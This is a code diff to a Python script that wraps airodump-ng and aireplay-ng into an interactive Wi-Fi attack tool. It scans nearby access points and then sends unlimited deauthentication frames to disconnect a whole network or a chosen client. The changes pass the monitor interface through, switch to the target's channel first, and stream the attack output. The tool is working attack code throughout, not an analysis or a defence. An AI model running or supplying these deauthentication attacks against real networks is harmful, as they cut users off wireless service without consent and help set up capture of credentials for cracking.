@@ -6,6 +6,7 @@ import sys
 import re
 from pathlib import Path
 OUTPUT_FILE = "/tmp/airodump_full_output"
+
 def check_req():
 	try:
 		for cmd in ["aircrack-ng", "iwconfig", "systemctl"]:
@@ -107,9 +108,14 @@ def startup(interface):
 	return enable_monitor_mode(interface)
 
 def kill(airodump_pid):
-	print("\nKilling...")
-	print(f"Stopping airodump-ng (PID {airodump_pid})...")
-	os.kill(airodump_pid, 9)
+	try:
+		print("\nKilling...")
+		print(f"Stopping process with PID {airodump_pid}...")
+		os.kill(airodump_pid, 9)  # 9 is SIGKILL to forcefully terminate the process
+	except ProcessLookupError:
+		print(f"\nNo process found with PID {airodump_pid}. It may have already terminated.")
+	except Exception as e:
+		print(f"\nAn error occurred while trying to kill the process: {e}")
 	
 def display_table(file_path):
 	try:
@@ -151,67 +157,97 @@ def display_table(file_path):
 		sys.stdout.write(f"An error occurred while displaying the table: {e}\n")
 		sys.stdout.flush()
 
-def deauth_ap(bssid, channel):
+def deauth_ap(bssid, channel, mon_interface):
 	print(f"Deauthenticating AP {bssid} on channel {channel}...")
 	airodump_command = [
-		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid
+		"sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, mon_interface
 	]
+	
 	command_str = " ".join(airodump_command)
-	print(f"Executing {command_str}")
+	print(f"Executing command: {command_str}")
+	
 	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	airodump_pid = airodump_proc.pid
 	print(f"airodump-ng started with PID {airodump_pid}")
+	
+	print(f"Switching to channel {channel}...")
+	time.sleep(4)
+	
+	print("Killing airodump-ng and switching to deauth protocol...")
+	kill(airodump_pid)
+	
+	airodump_command = [
+		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface
+	]
+	command_str = " ".join(airodump_command)
+	print(f"Executing command: {command_str}")
+	
+	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	airodump_pid = airodump_proc.pid
+	print(f"aireplay-ng started with PID {airodump_pid}")
+	
 	try:
-		stdout, stderr = airodump_proc.communicate(timeout=10)
-		print("\n--- Command Output ---")
-		print(stdout)
-		if stderr.strip():
-			print("\n--- Command Errors ---")
-			print(stderr)
-	except subprocess.TimeoutExpired:
-		print("\nCommand is taking too long. You can stop it manually.")
+		for line in iter(airodump_proc.stdout.readline, b''):
+			print(line.decode('utf-8').strip())
+		for line in iter(airodump_proc.stderr.readline, b''):
+			print(line.decode('utf-8').strip())
+		
+		airodump_proc.stdout.close()
+		airodump_proc.stderr.close()
+		airodump_proc.wait()
+		
+	except KeyboardInterrupt:
+		kill(airodump_pid)
+		return
 	except Exception as e:
 		print(f"\nAn error occurred while executing the command: {e}")
-	while True:
-		a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
-		if a in ("s", "k", "1", "stop"):
-			kill(airodump_pid)
-			break
+		return
+
 def deauth_client(bssid, channel, essid, mon_interface):
 	print(f"Deauthenticating client {essid} on AP {bssid} at channel {channel}...")
 	airodump_command = [
-		"sudo", "airodump-ng","--bssid", bssid, "--channel", channel, mon_interface
+		"sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, mon_interface
 	]
+	
+	command_str = " ".join(airodump_command)
+	print(f"Executing command: {command_str}")
+	
 	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	airodump_pid = airodump_proc.pid
+	print(f"airodump-ng started with PID {airodump_pid}")
+	
 	print(f"Switching to channel {channel}...")
 	time.sleep(4)
-	print("Killing airodump channel switching... switching to deauth protocol...")
+	
+	print("Killing airodump-ng and switching to deauth protocol...")
 	kill(airodump_pid)
+	
 	airodump_command = [
 		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", essid, mon_interface
 	]
 	command_str = " ".join(airodump_command)
-	print(f"Executing {command_str}")
+	print(f"Executing command: {command_str}")
+	
 	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	airodump_pid = airodump_proc.pid
-	print(f"airodump-ng started with PID {airodump_pid}")
+	print(f"aireplay-ng started with PID {airodump_pid}")
+	
 	try:
-		stdout, stderr = airodump_proc.communicate(timeout=10)
-		print("\n--- Command Output ---")
-		print(stdout)
-		if stderr.strip():
-			print("\n--- Command Errors ---")
-			print(stderr)
-	except subprocess.TimeoutExpired:
-		print("\nCommand is taking too long. You can stop it manually.")
+		for line in iter(airodump_proc.stdout.readline, b''):
+			print(line.decode('utf-8').strip())
+		for line in iter(airodump_proc.stderr.readline, b''):
+			print(line.decode('utf-8').strip())
+		
+		airodump_proc.stdout.close()
+		airodump_proc.stderr.close()
+		airodump_proc.wait()
+		
+	except KeyboardInterrupt:
+		kill(airodump_pid)
+		return
 	except Exception as e:
 		print(f"\nAn error occurred while executing the command: {e}")
-	a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
-	if a in ("s", "k", "1", "stop"):
-		kill(airodump_pid)
-		return 0
-
+		return
 
 def clients(mon_interface, bssid, channel):
 	a = input("Deauth client? (1(yes )or 2(no)): ").lower()
@@ -228,7 +264,7 @@ def fun(mon_interface):
 			channel = input("Your chosen Channel: ")
 			a = input("Deauth the whole AP or Keep Dumping specific AP? (1 or 2) (q to quit)")
 			if a == "1":
-				deauth_ap(bssid, channel)
+				deauth_ap(bssid, channel, mon_interface)
 			elif a == "2":
 				if Path(f"{OUTPUT_FILE}-01.csv").exists():
 					print(f"Removing output file {OUTPUT_FILE}-01.csv...")
@@ -278,7 +314,6 @@ def fun(mon_interface):
 		finally:
 			kill(airodump_pid)
 
-
 def main():
 	airodump_pid = None
 	mon_interface = None
@@ -320,13 +355,10 @@ def main():
 	except Exception as e:
 		print(f"An error occurred: {e}")
 	finally:
-		# Cleanup when done
 		if mon_interface:
 			cleanup(airodump_pid, mon_interface)
 		else:
 			print("No monitor interface to cleanup.")
 
-
 if __name__ == "__main__":
 	main()
-
